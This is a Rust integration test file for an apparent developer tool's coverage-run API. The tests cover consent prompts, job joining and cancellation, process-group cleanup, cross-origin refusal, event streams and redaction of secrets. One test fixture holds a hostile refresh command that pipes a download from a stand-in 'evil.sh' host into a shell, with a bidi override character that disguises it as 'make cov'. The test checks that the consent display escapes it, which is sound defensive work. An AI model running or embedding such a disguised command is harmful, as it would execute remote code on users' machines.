//! The Coverage page's Run coverage job (S-738, [FR-CV-15], [FR-CV-13],
//! [NFR-SE-06]) through the real router, in process: a `coverage-run` job on
//! the runner the security scan runs on.
//!
//! Every fixture finds its tools only in a stub directory and keeps its
//! consent record in a temporary user directory, so no coverage tool or
//! scanner of this machine runs and the process environment is never changed.
//! The stubs that must still be running when the test acts wait for a release
//! file, or sleep and leave descendants behind — a forked test JVM, and a
//! build daemon that detaches from the tool — until the job is cancelled; the
//! tool `PATH` is the stub directory alone, so they name `/bin/sleep`
//! absolutely. Every test runs under [`BOUND`].
//!
//! [FR-CV-15]: ../../docs/specs/requirements/FR-CV-15.md
//! [FR-CV-13]: ../../docs/specs/requirements/FR-CV-13.md
//! [NFR-SE-06]: ../../docs/specs/requirements/NFR-SE-06.md
#![cfg(unix)]

use std::os::unix::fs::PermissionsExt;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::Arc;
use std::time::{Duration, Instant};

use axum::{
    body::Body,
    http::{header, Method, Request, StatusCode},
    Router,
};
use http_body_util::BodyExt;
use logos_core::Engine;
use serde_json::{json, Value};
use tempfile::TempDir;
use tower::ServiceExt;
use web::{IntentToken, INTENT_HEADER};

/// The whole of any one test, tools included.
const BOUND: Duration = Duration::from_secs(120);

/// How long a job, or a stub's start, is waited for before the test fails.
const JOB_WAIT: Duration = Duration::from_secs(30);

const ORIGIN: &str = "http://127.0.0.1:4983";

const RUN: &str = "/api/v1/coverage/run";
const CANCEL: &str = "/api/v1/coverage/run/cancel";

/// What a failing build prints: it must reach the failure log only.
const PLANTED: &str = "LOGOSPLANTEDSECRET0123456789abcdef";

/// A Bandit report with no finding, for the scan beside the run.
const CLEAN_BANDIT: &str = r#"{"version":"2.1.0","runs":[{"tool":{"driver":{"name":"Bandit","semanticVersion":"1.7.10","rules":[]}},"results":[]}]}"#;

struct Fixture {
    _tmp: TempDir,
    repo: PathBuf,
    bin: PathBuf,
    user: PathBuf,
    rec: PathBuf,
    intent: IntentToken,
    router: Router,
}

impl Fixture {
    /// A one-commit repository holding `files`, whose engine looks for tools
    /// in `bin` and keeps its consent in `user`. Stubs are written into `bin`
    /// afterwards: a tool is looked up when a run starts.
    fn new(files: &[(&str, &str)]) -> Self {
        let tmp = TempDir::new().unwrap();
        let base = tmp.path().canonicalize().unwrap();
        let [repo, bin, user, rec] = ["project", "bin", "user", "rec"].map(|d| base.join(d));
        for dir in [&repo, &bin, &user, &rec] {
            std::fs::create_dir_all(dir).unwrap();
        }
        git(&repo, &["init", "-q", "-b", "main"]);
        for (path, body) in files {
            let path = repo.join(path);
            std::fs::create_dir_all(path.parent().unwrap()).unwrap();
            std::fs::write(path, body).unwrap();
        }
        git(&repo, &["add", "."]);
        git(&repo, &["commit", "-q", "-m", "seed"]);
        let env = logos_core::security::ScanEnvironment {
            user_dir: Some(user.clone()),
            search_path: Some(bin.clone().into_os_string()),
            tools_dir: None,
            nvd_api_key: None,
        };
        let engine = Engine::start(&repo).expect("engine starts").with_scan_environment(env);
        engine.index();
        let intent = IntentToken::generate();
        let router = web::router_with_intent(Arc::new(engine), intent.clone());
        Self { _tmp: tmp, repo, bin, user, rec, intent, router }
    }

    /// A Go module with one source file.
    fn go() -> Self {
        Self::new(&[
            ("go.mod", "module example.com/calc\n\ngo 1.23\n"),
            ("calc.go", "package calc\n\nfunc Add(a, b int) int {\n\treturn a + b\n}\n"),
        ])
    }

    /// Record the project's coverage execution consent for `tools`.
    fn consent(&self, tools: &[&str]) {
        logos_core::coverage::consent::require(Some(&self.user), &self.repo, tools, None, true, "logos coverage run")
            .expect("the user consents");
    }

    async fn send(&self, req: Request<Body>) -> (StatusCode, Value) {
        let resp = self.router.clone().oneshot(req).await.unwrap();
        let status = resp.status();
        let bytes = resp.into_body().collect().await.unwrap().to_bytes();
        let body = serde_json::from_slice(&bytes)
            .unwrap_or_else(|_| Value::String(String::from_utf8_lossy(&bytes).into_owned()));
        (status, body)
    }

    /// A same-origin, intent-bearing `POST`.
    async fn post(&self, path: &str, body: &str) -> (StatusCode, Value) {
        self.send(post(path, Some(self.intent.as_str()), Some(ORIGIN), body)).await
    }

    async fn get(&self, path: &str) -> (StatusCode, Value) {
        self.send(get(path)).await
    }

    /// The member's coverage job, once it is no longer running.
    async fn ended(&self) -> Value {
        let deadline = Instant::now() + JOB_WAIT;
        loop {
            let (status, body) = self.get(RUN).await;
            assert_eq!(status, StatusCode::OK, "{body}");
            if body["job"]["state"] != "running" {
                return body["job"].clone();
            }
            assert!(Instant::now() < deadline, "the job is still running: {body}");
            tokio::time::sleep(Duration::from_millis(25)).await;
        }
    }

    /// The pids a stub wrote to `rec/<name>`, once the line is there.
    async fn pids(&self, name: &str) -> Vec<u32> {
        let path = self.rec.join(name);
        let deadline = Instant::now() + JOB_WAIT;
        loop {
            if let Some(line) = std::fs::read_to_string(&path).ok().filter(|s| s.ends_with('\n')) {
                return line.split_whitespace().map(|p| p.parse().unwrap()).collect();
            }
            assert!(Instant::now() < deadline, "{name} was never written");
            tokio::time::sleep(Duration::from_millis(10)).await;
        }
    }

    /// Every recorded non-version invocation of `name`, one argv per line.
    fn runs(&self, name: &str) -> Vec<String> {
        std::fs::read_to_string(self.rec.join(format!("{name}.runs")))
            .map(|s| s.lines().map(str::to_string).collect())
            .unwrap_or_default()
    }

    /// Let a [`held`] stub go on.
    fn release(&self) {
        std::fs::write(self.rec.join("release"), "").unwrap();
    }
}

/// A stub tool: answers `version_arg` with `version`, records each other
/// invocation in `rec/<name>.runs`, then runs `body`.
fn stub(f: &Fixture, name: &str, version_arg: &str, version: &str, body: &str) {
    let script = format!(
        "#!/bin/sh\n\
         [ \"$1\" = '{version_arg}' ] && {{ printf '%s\\n' '{version}'; exit 0; }}\n\
         printf '%s\\n' \"$*\" >> '{rec}/{name}.runs'\n\
         {body}\n",
        rec = f.rec.display(),
    );
    let path = f.bin.join(name);
    std::fs::write(&path, script).unwrap();
    std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755)).unwrap();
}

/// A stub `go` that writes its coverprofile once `body` has run.
fn go_stub(f: &Fixture, body: &str) {
    let report = "for a in \"$@\"; do case $a in -coverprofile=*) \
                  printf 'mode: set\\nexample.com/calc/calc.go:3.24,5.2 1 1\\n' > \"${a#-coverprofile=}\";; esac; done";
    stub(f, "go", "version", "go version go1.23.1 darwin/arm64", &format!("{body}\n{report}"));
}

/// A stub body that waits for [`Fixture::release`].
fn held(f: &Fixture) -> String {
    format!("while [ ! -f '{}/release' ]; do /bin/sleep 0.05; done", f.rec.display())
}

/// A JVM build stub body: a forked test JVM in the tool's group, and a build
/// daemon that detaches — its parent subshell exits, so it is re-parented
/// away from the tool, still in its group — each pid written to
/// `rec/<name>.pids` with the tool's own, then the tool waits on the JVM.
fn jvm_build(f: &Fixture, name: &str) -> String {
    let pids = f.rec.join(format!("{name}.pids"));
    format!(
        "/bin/sleep 60 &\njvm=$!\n\
         ( /bin/sleep 60 & echo $! > '{p}.daemon' )\n\
         echo $$ $jvm $(/bin/cat '{p}.daemon') > '{p}.tmp' && /bin/mv '{p}.tmp' '{p}'\n\
         wait $jvm",
        p = pids.display()
    )
}

fn git(cwd: &Path, args: &[&str]) {
    let out = Command::new("git")
        .arg("-C")
        .arg(cwd)
        .args(["-c", "maintenance.auto=false", "-c", "gc.auto=0", "-c", "user.email=t@logos", "-c", "user.name=t"])
        .args(args)
        .output()
        .expect("git runs");
    assert!(out.status.success(), "git {args:?}: {}", String::from_utf8_lossy(&out.stderr));
}

fn get(path: &str) -> Request<Body> {
    Request::builder()
        .method(Method::GET)
        .uri(path)
        .header(header::HOST, "127.0.0.1:4983")
        .body(Body::empty())
        .unwrap()
}

fn post(path: &str, intent: Option<&str>, origin: Option<&str>, body: &str) -> Request<Body> {
    let mut builder = Request::builder()
        .method(Method::POST)
        .uri(path)
        .header(header::HOST, "127.0.0.1:4983")
        .header(header::CONTENT_TYPE, "application/json");
    if let Some(origin) = origin {
        builder = builder.header(header::ORIGIN, origin);
    }
    if let Some(token) = intent {
        builder = builder.header(INTENT_HEADER, token);
    }
    builder.body(Body::from(body.to_string())).unwrap()
}

/// Every pid in the process table.
fn process_table() -> Vec<u32> {
    let out = Command::new("ps").args(["-A", "-o", "pid="]).output().expect("ps runs");
    assert!(out.status.success(), "ps failed");
    String::from_utf8_lossy(&out.stdout).lines().filter_map(|line| line.trim().parse().ok()).collect()
}

/// Wait until the process table holds none of `pids`.
async fn all_gone(pids: &[u32]) -> Result<(), Vec<u32>> {
    let deadline = Instant::now() + Duration::from_secs(10);
    loop {
        let left: Vec<u32> = process_table().into_iter().filter(|p| pids.contains(p)).collect();
        if left.is_empty() {
            return Ok(());
        }
        if Instant::now() > deadline {
            return Err(left);
        }
        tokio::time::sleep(Duration::from_millis(25)).await;
    }
}

async fn bounded(test: impl std::future::Future<Output = ()>) {
    tokio::time::timeout(BOUND, test).await.expect("the test ran past its bound");
}

/// AC: a second start while the run goes joins it — the same job, and the
/// tool runs once.
#[tokio::test]
async fn a_second_start_while_running_joins_the_same_job() {
    bounded(async {
        let f = Fixture::go();
        go_stub(&f, &held(&f));
        f.consent(&["go"]);

        let (status, first) = f.post(RUN, "").await;
        assert_eq!(status, StatusCode::OK, "{first}");
        assert_eq!((first["joined"].as_bool(), first["job"]["state"].as_str()), (Some(false), Some("running")), "{first}");
        assert_eq!(first["job"]["kind"], "coverage-run");

        let (status, second) = f.post(RUN, "{}").await;
        assert_eq!(status, StatusCode::OK, "{second}");
        assert_eq!(second["joined"], true, "the second click joins: {second}");
        assert_eq!(second["job"]["id"], first["job"]["id"], "the same job");

        f.release();
        let job = f.ended().await;
        assert_eq!(job["state"], "completed", "{job}");
        assert_eq!(f.runs("go").len(), 1, "the joined start ran no second run");
        let go = job["result"]["tools"].as_array().unwrap().iter().find(|t| t["tool"] == "go").unwrap().clone();
        assert_eq!(go["outcome"], "ran", "{job}");
        // The page reads the stored report the run ingested.
        let (_, page) = f.get("/api/v1/coverage").await;
        assert_eq!(page["coverage"]["report_count"], 1, "{page}");
    })
    .await;
}

/// A Run right after Cancel starts a new run — a new job, not joined — once
/// the cancelled one has ended; it never joins the run being cancelled (a
/// review finding, S-738).
#[tokio::test]
async fn a_start_right_after_cancel_starts_a_new_run() {
    bounded(async {
        let f = Fixture::go();
        go_stub(&f, &held(&f));
        f.consent(&["go"]);
        let (_, first) = f.post(RUN, "").await;
        let deadline = Instant::now() + JOB_WAIT;
        while f.runs("go").is_empty() {
            assert!(Instant::now() < deadline, "go never started");
            tokio::time::sleep(Duration::from_millis(10)).await;
        }
        f.post(CANCEL, "").await;
        let (status, again) = f.post(RUN, "").await;
        assert_eq!(status, StatusCode::OK, "{again}");
        assert_eq!(again["joined"], false, "the Run after Cancel joined the run being cancelled: {again}");
        assert_ne!(again["job"]["id"], first["job"]["id"], "a new job");

        f.release();
        assert_eq!(f.ended().await["state"], "completed");
        assert_eq!(f.runs("go").len(), 2, "the new run ran the tool again");
    })
    .await;
}

/// AC: a security scan and a coverage run of one member run at the same
/// time — neither joins nor refuses the other — and each ends on its own.
#[tokio::test]
async fn a_security_scan_and_a_coverage_run_run_at_the_same_time() {
    bounded(async {
        let f = Fixture::new(&[
            ("go.mod", "module example.com/calc\n\ngo 1.23\n"),
            ("calc.go", "package calc\n\nfunc Add(a, b int) int {\n\treturn a + b\n}\n"),
            ("app.py", "import sqlite3\n"),
        ]);
        go_stub(&f, &held(&f));
        f.consent(&["go"]);
        let scanner = format!(
            "{}\nout=''; prev=''\nfor a in \"$@\"; do [ \"$prev\" = --output ] && out=\"$a\"; prev=\"$a\"; done\n\
             printf '%s' '{CLEAN_BANDIT}' > \"$out\"",
            held(&f)
        );
        stub(&f, "bandit", "--version", "bandit 1.7.10", &scanner);
        logos_core::config::record_scan_consent(Some(&f.user), &f.repo, &["bandit"]).unwrap();

        let (status, coverage) = f.post(RUN, "").await;
        assert_eq!(status, StatusCode::OK, "{coverage}");
        let (status, scan) = f.post("/api/v1/security/scan", "").await;
        assert_eq!(status, StatusCode::OK, "a scan starts beside the coverage run: {scan}");
        assert_eq!(scan["joined"], false, "{scan}");
        assert_ne!(scan["job"]["id"], coverage["job"]["id"], "two jobs");
        let deadline = Instant::now() + JOB_WAIT;
        while f.runs("go").is_empty() || f.runs("bandit").is_empty() {
            assert!(Instant::now() < deadline, "both tools never ran at once");
            tokio::time::sleep(Duration::from_millis(10)).await;
        }
        assert_eq!(f.get(RUN).await.1["job"]["state"], "running");
        assert_eq!(f.get("/api/v1/security/scan").await.1["job"]["state"], "running");

        f.release();
        assert_eq!(f.ended().await["state"], "completed");
        let deadline = Instant::now() + JOB_WAIT;
        loop {
            let (_, scan) = f.get("/api/v1/security/scan").await;
            if scan["job"]["state"] != "running" {
                assert_eq!(scan["job"]["state"], "completed", "{scan}");
                break;
            }
            assert!(Instant::now() < deadline, "the scan never ended");
            tokio::time::sleep(Duration::from_millis(25)).await;
        }
    })
    .await;
}

/// AC: cancel on a Maven run kills the tool's whole process group — `mvn`
/// itself, its forked test JVM and the build daemon that detached from it —
/// so none of them is left; the job ends cancelled and no tool starts after.
#[tokio::test]
async fn cancel_on_a_maven_run_leaves_no_descendant_process() {
    bounded(async {
        let f = Fixture::new(&[
            ("pom.xml", "<project><modelVersion>4.0.0</modelVersion></project>\n"),
            ("go.mod", "module example.com/calc\n\ngo 1.23\n"),
        ]);
        stub(&f, "mvn", "--version", "Apache Maven 3.9.9 (8e8579a9e76f7d015ee5ec7bfcdc97d260186937)", &jvm_build(&f, "mvn"));
        go_stub(&f, "");
        f.consent(&["maven", "go"]);

        let (status, started) = f.post(RUN, "").await;
        assert_eq!(status, StatusCode::OK, "{started}");
        let pids = f.pids("mvn.pids").await;
        assert_eq!(pids.len(), 3, "mvn, its JVM and its daemon: {pids:?}");
        assert!(pids.iter().all(|p| process_table().contains(p)), "all three run before the cancel");

        let (status, cancelling) = f.post(CANCEL, "").await;
        assert_eq!(status, StatusCode::OK, "{cancelling}");
        assert_eq!(cancelling["job"]["id"], started["job"]["id"]);
        let job = f.ended().await;
        assert_eq!(job["state"], "cancelled", "{job}");
        if let Err(left) = all_gone(&pids).await {
            panic!("Maven processes survived the cancel: {left:?}");
        }
        assert!(f.runs("go").is_empty(), "a tool started after the cancel");
        let steps: Vec<Value> = job["events"].as_array().unwrap().iter().map(|e| e["event"].clone()).collect();
        assert!(steps.contains(&json!({ "phase": "started", "tool": "maven" })), "{steps:?}");
        let maven = steps.iter().find(|s| s["phase"] == "finished" && s["tool"] == "maven").expect("maven settles");
        assert_eq!(maven["outcome"], "cancelled", "{maven}");
    })
    .await;
}

/// AC: the same for Gradle, which Logos runs with `--no-daemon`: a daemon the
/// build still detaches dies with the cancel, as does the test JVM.
#[tokio::test]
async fn cancel_on_a_gradle_run_leaves_no_daemon_or_jvm() {
    bounded(async {
        let f = Fixture::new(&[("build.gradle", "plugins { id 'java' }\n")]);
        stub(&f, "gradle", "--version", "Gradle 8.10.2", &jvm_build(&f, "gradle"));
        f.consent(&["gradle"]);

        f.post(RUN, "").await;
        let pids = f.pids("gradle.pids").await;
        assert_eq!(pids.len(), 3, "{pids:?}");
        let argv = f.runs("gradle");
        assert!(argv[0].split_whitespace().any(|a| a == "--no-daemon"), "gradle runs with --no-daemon: {argv:?}");

        f.post(CANCEL, "").await;
        assert_eq!(f.ended().await["state"], "cancelled");
        if let Err(left) = all_gone(&pids).await {
            panic!("Gradle processes survived the cancel: {left:?}");
        }
    })
    .await;
}

/// AC: a serve that goes away while a run goes leaves no orphan. Dropping the
/// router drops its runner, which kills every running job's process group —
/// the tool, its JVM and its detached daemon. (The stopping `serve` itself
/// cancels and waits through `AnalysisJobs::shutdown`, the core's tests.)
#[tokio::test]
async fn a_serve_that_goes_away_leaves_no_orphan() {
    bounded(async {
        let f = Fixture::new(&[("build.gradle", "plugins { id 'java' }\n")]);
        stub(&f, "gradle", "--version", "Gradle 8.10.2", &jvm_build(&f, "gradle"));
        f.consent(&["gradle"]);
        f.post(RUN, "").await;
        let pids = f.pids("gradle.pids").await;

        drop(f.router);
        if let Err(left) = all_gone(&pids).await {
            panic!("processes outlived the serve: {left:?}");
        }
    })
    .await;
}

/// [FR-CV-13]: without consent a start answers `409` with what the dialog
/// shows — the tools, and the custom command verbatim — and records and
/// starts nothing. An answer that leaves out a tool, or accepts a command text
/// other than the one configured, is asked again; the one that accepts all of
/// it records exactly that in the user config directory — never in the
/// repository — and runs; later starts are not asked again.
#[tokio::test]
async fn consent_names_the_tools_and_the_command_and_is_recorded_once_accepted() {
    bounded(async {
        let f = Fixture::new(&[
            ("go.mod", "module example.com/calc\n\ngo 1.23\n"),
            ("calc.go", "package calc\n\nfunc Add(a, b int) int {\n\treturn a + b\n}\n"),
            (".logos/config.toml", "[coverage_ingest]\nrefresh_cmd = \"true\"\n"),
        ]);
        go_stub(&f, "");

        let (status, refused) = f.post(RUN, "").await;
        assert_eq!(status, StatusCode::CONFLICT, "{refused}");
        assert_eq!(
            refused["consent_required"],
            json!({ "tools": ["go", "custom"], "refresh_cmd": "true", "command_changed": false }),
            "{refused}"
        );
        assert!(refused["error"].as_str().unwrap().contains("executes the project's own code"), "{refused}");
        assert_eq!(refused["refresh_cmd_shown"], "true", "{refused}");

        for (answer, why) in [
            (r#"{"consent":["go"]}"#, "the custom command is not accepted"),
            (r#"{"consent":["custom"],"refresh_cmd":"true"}"#, "go is not accepted"),
            (r#"{"consent":["go","custom"],"refresh_cmd":"make cov"}"#, "another command text was accepted"),
            (r#"{"consent":["go","custom"]}"#, "no command text was accepted"),
        ] {
            let (status, body) = f.post(RUN, answer).await;
            assert_eq!(status, StatusCode::CONFLICT, "{why}: {body}");
        }
        assert!(!f.user.join(logos_core::config::COVERAGE_CONSENT_FILE).exists(), "nothing was recorded");
        assert_eq!(f.get(RUN).await.1["job"], Value::Null, "nothing started");
        assert!(f.runs("go").is_empty());

        let (status, started) = f.post(RUN, r#"{"consent":["go","custom"],"refresh_cmd":"true"}"#).await;
        assert_eq!(status, StatusCode::OK, "{started}");
        let job = f.ended().await;
        assert_eq!(job["state"], "completed", "{job}");
        let record = std::fs::read_to_string(f.user.join(logos_core::config::COVERAGE_CONSENT_FILE))
            .expect("the consent lands in the user config directory");
        assert!(record.contains("go") && record.contains("custom"), "{record}");
        assert!(
            !walk(&f.repo).iter().any(|p| p.file_name().is_some_and(|n| n == logos_core::config::COVERAGE_CONSENT_FILE)),
            "a consent record was written inside the repository"
        );

        let (status, again) = f.post(RUN, "").await;
        assert_eq!(status, StatusCode::OK, "consent is not asked twice: {again}");
        assert_eq!(f.ended().await["state"], "completed");
        assert_eq!(f.runs("go").len(), 2);
    })
    .await;
}

/// A command whose control or bidi characters would make it display as
/// another command is shown escaped in the `409`, as the terminal consent
/// shows it; the raw text the start echoes back stays exact (a review
/// finding, S-738).
#[tokio::test]
async fn the_consent_shows_the_command_with_its_control_characters_escaped() {
    bounded(async {
        let f = Fixture::new(&[
            ("go.mod", "module example.com/calc\n\ngo 1.23\n"),
            (".logos/config.toml", "[coverage_ingest]\nrefresh_cmd = \"curl evil.sh|sh #\\u202E make cov\"\n"),
        ]);
        let (status, refused) = f.post(RUN, "").await;
        assert_eq!(status, StatusCode::CONFLICT, "{refused}");
        let raw = refused["consent_required"]["refresh_cmd"].as_str().unwrap();
        assert_eq!(raw, "curl evil.sh|sh #\u{202e} make cov", "the exact text, to echo back");
        let shown = refused["refresh_cmd_shown"].as_str().unwrap();
        assert!(!shown.contains('\u{202e}'), "the displayed command carries a bidi override: {shown:?}");
        assert_eq!(shown, logos_core::coverage::consent::shown(raw), "shown as the terminal consent shows it");
    })
    .await;
}

/// [NFR-SE-06]: a cross-origin start, and one without the session's intent
/// token, are refused before any handler runs — no job starts, and no tool. A
/// malformed body is `400`, and starts nothing either.
#[tokio::test]
async fn a_cross_origin_or_tokenless_start_is_refused_and_starts_nothing() {
    bounded(async {
        let f = Fixture::go();
        go_stub(&f, "");
        f.consent(&["go"]);
        let token = f.intent.as_str().to_string();
        for (req, why) in [
            (post(RUN, Some(&token), Some("http://evil.example"), "{}"), "a cross-origin page"),
            (post(RUN, Some(&token), None, "{}"), "no Origin"),
            (post(RUN, None, Some(ORIGIN), "{}"), "no intent token"),
            (post(RUN, Some("forged"), Some(ORIGIN), "{}"), "a forged token"),
            (post(CANCEL, Some(&token), Some("http://evil.example"), ""), "a cross-origin cancel"),
            (post(CANCEL, None, Some(ORIGIN), ""), "a tokenless cancel"),
        ] {
            let (status, body) = f.send(req).await;
            assert_eq!(status, StatusCode::FORBIDDEN, "{why} must be refused: {body}");
        }
        assert_eq!(f.get(RUN).await.1["job"], Value::Null, "no job started");
        assert!(f.runs("go").is_empty(), "no tool started");

        for body in [r#"{"consent":"yes please"}"#, r#"{"tools":["go"]}"#] {
            let (status, answer) = f.post(RUN, body).await;
            assert_eq!(status, StatusCode::BAD_REQUEST, "{answer}");
        }
        assert_eq!(f.get(RUN).await.1["job"], Value::Null, "a malformed start started nothing");
    })
    .await;
}

/// The event stream (`Accept: text/event-stream`) replays what the run
/// reported so far, follows it as it goes, and ends with one `end` event
/// carrying the job as it ended; a stream with no job ends at once.
#[tokio::test]
async fn the_event_stream_replays_then_follows_the_run_to_its_end() {
    bounded(async {
        let f = Fixture::go();
        go_stub(&f, &held(&f));
        f.consent(&["go"]);

        let (status, body) = stream(&f).await;
        assert_eq!(status, StatusCode::OK);
        assert_eq!(sse_events(&body), [("end".to_string(), json!({ "job": null }))], "{body}");

        f.post(RUN, "").await;
        let deadline = Instant::now() + JOB_WAIT;
        while f.runs("go").is_empty() {
            assert!(Instant::now() < deadline, "go never started");
            tokio::time::sleep(Duration::from_millis(10)).await;
        }
        let router = f.router.clone();
        let following = tokio::spawn(async move { read_stream(router).await });
        tokio::time::sleep(Duration::from_millis(300)).await;
        assert!(!following.is_finished(), "the stream stays open while the run goes");
        f.release();
        let (status, body) = following.await.unwrap();
        assert_eq!(status, StatusCode::OK);
        let events = sse_events(&body);
        let names: Vec<&str> = events.iter().map(|(name, _)| name.as_str()).collect();
        assert_eq!(names.last(), Some(&"end"), "{body}");
        assert!(names[..names.len() - 1].iter().all(|n| *n == "step"), "{body}");
        let steps: Vec<Value> = events.iter().filter(|(n, _)| n == "step").map(|(_, d)| d["event"].clone()).collect();
        let go_started = steps.iter().position(|s| *s == json!({ "phase": "started", "tool": "go" })).expect("the replayed start");
        assert_eq!((&steps[go_started + 1]["phase"], &steps[go_started + 1]["tool"]), (&json!("finished"), &json!("go")), "{body}");
        let seqs: Vec<u64> = events.iter().filter(|(n, _)| n == "step").map(|(_, d)| d["seq"].as_u64().unwrap()).collect();
        assert_eq!(seqs, (0..seqs.len() as u64).collect::<Vec<_>>(), "each event once, in order");
        let end = &events.last().unwrap().1["job"];
        assert_eq!(end["state"], "completed", "{end}");
        assert_eq!(end["events"], json!([]), "the end carries no second copy of the events");
        assert_eq!(end["result"]["tools"].as_array().unwrap().len(), 7, "{end}");
    })
    .await;
}

/// A stream that follows a run which is then cancelled ends: one `end` event
/// carrying the cancelled job, then the stream closes — the page's stream
/// never hangs after Cancel (a review finding, S-738).
#[tokio::test]
async fn the_event_stream_ends_when_the_run_it_follows_is_cancelled() {
    bounded(async {
        let f = Fixture::go();
        go_stub(&f, &held(&f));
        f.consent(&["go"]);
        f.post(RUN, "").await;
        let deadline = Instant::now() + JOB_WAIT;
        while f.runs("go").is_empty() {
            assert!(Instant::now() < deadline, "go never started");
            tokio::time::sleep(Duration::from_millis(10)).await;
        }
        let router = f.router.clone();
        let following = tokio::spawn(async move { read_stream(router).await });
        tokio::time::sleep(Duration::from_millis(300)).await;
        f.post(CANCEL, "").await;
        let (status, body) = tokio::time::timeout(JOB_WAIT, following)
            .await
            .expect("the stream ended after the cancel")
            .unwrap();
        assert_eq!(status, StatusCode::OK);
        let events = sse_events(&body);
        let (name, end) = events.last().expect("an event");
        assert_eq!((name.as_str(), &end["job"]["state"]), ("end", &json!("cancelled")), "{body}");
    })
    .await;
}

/// The security contract: what a failing build prints — a secret among it —
/// reaches the failure log only, never the job's events or result, the GET,
/// or the event stream.
#[tokio::test]
async fn a_secret_a_failing_build_prints_reaches_no_payload() {
    bounded(async {
        let f = Fixture::go();
        stub(&f, "go", "version", "go version go1.23.1 darwin/arm64", &format!("echo 'error: token={PLANTED} rejected' >&2\nexit 2"));
        f.consent(&["go"]);
        f.post(RUN, "").await;
        let job = f.ended().await;
        let go = job["result"]["tools"].as_array().unwrap().iter().find(|t| t["tool"] == "go").unwrap().clone();
        assert_eq!(go["outcome"], "failed", "{job}");
        let (_, answer) = f.get(RUN).await;
        let (_, streamed) = stream(&f).await;
        for (what, text) in [("the job", job.to_string()), ("the GET", answer.to_string()), ("the stream", streamed)] {
            assert!(!text.contains(PLANTED), "{what} carries the planted secret: {text}");
        }
        let log = std::fs::read_to_string(f.repo.join(".logos/coverage/go.failed.log")).unwrap();
        assert!(log.contains(PLANTED), "the whole output stays in the failure log");
    })
    .await;
}

/// A cancel with no run answers `{job: null}` and starts nothing; one after the
/// run ended leaves it `completed`, its result kept.
#[tokio::test]
async fn a_cancel_with_no_run_going_changes_nothing() {
    bounded(async {
        let f = Fixture::go();
        go_stub(&f, "");
        f.consent(&["go"]);
        assert_eq!(f.post(CANCEL, "").await, (StatusCode::OK, json!({ "job": null })));
        assert!(f.runs("go").is_empty());

        f.post(RUN, "").await;
        let done = f.ended().await;
        let (status, after) = f.post(CANCEL, "").await;
        assert_eq!(status, StatusCode::OK, "{after}");
        assert_eq!(after["job"]["state"], "completed", "{after}");
        assert_eq!(after["job"]["result"], done["result"], "the result is kept");
    })
    .await;
}

/// The member's coverage job as an event stream: its status and whole body.
async fn stream(f: &Fixture) -> (StatusCode, String) {
    read_stream(f.router.clone()).await
}

async fn read_stream(router: Router) -> (StatusCode, String) {
    let req = Request::builder()
        .method(Method::GET)
        .uri(RUN)
        .header(header::HOST, "127.0.0.1:4983")
        .header(header::ACCEPT, "text/event-stream")
        .body(Body::empty())
        .unwrap();
    let resp = router.oneshot(req).await.unwrap();
    let status = resp.status();
    let content_type = resp.headers().get(header::CONTENT_TYPE).map(|v| v.to_str().unwrap().to_string());
    assert_eq!(content_type.as_deref(), Some("text/event-stream"));
    let bytes = resp.into_body().collect().await.unwrap().to_bytes();
    (status, String::from_utf8(bytes.to_vec()).unwrap())
}

/// Each `event:` and its `data:` JSON, in order; keep-alive comments skipped.
fn sse_events(body: &str) -> Vec<(String, Value)> {
    body.split("\n\n")
        .filter_map(|block| {
            let mut name = None;
            let mut data = String::new();
            for line in block.lines() {
                if let Some(v) = line.strip_prefix("event: ") {
                    name = Some(v.to_string());
                } else if let Some(v) = line.strip_prefix("data: ") {
                    data.push_str(v);
                }
            }
            Some((name?, serde_json::from_str(&data).unwrap()))
        })
        .collect()
}

fn walk(dir: &Path) -> Vec<PathBuf> {
    let mut found = Vec::new();
    for entry in std::fs::read_dir(dir).unwrap().flatten() {
        let path = entry.path();
        if path.is_dir() {
            found.extend(walk(&path));
        } else {
            found.push(path);
        }
    }
    found
}
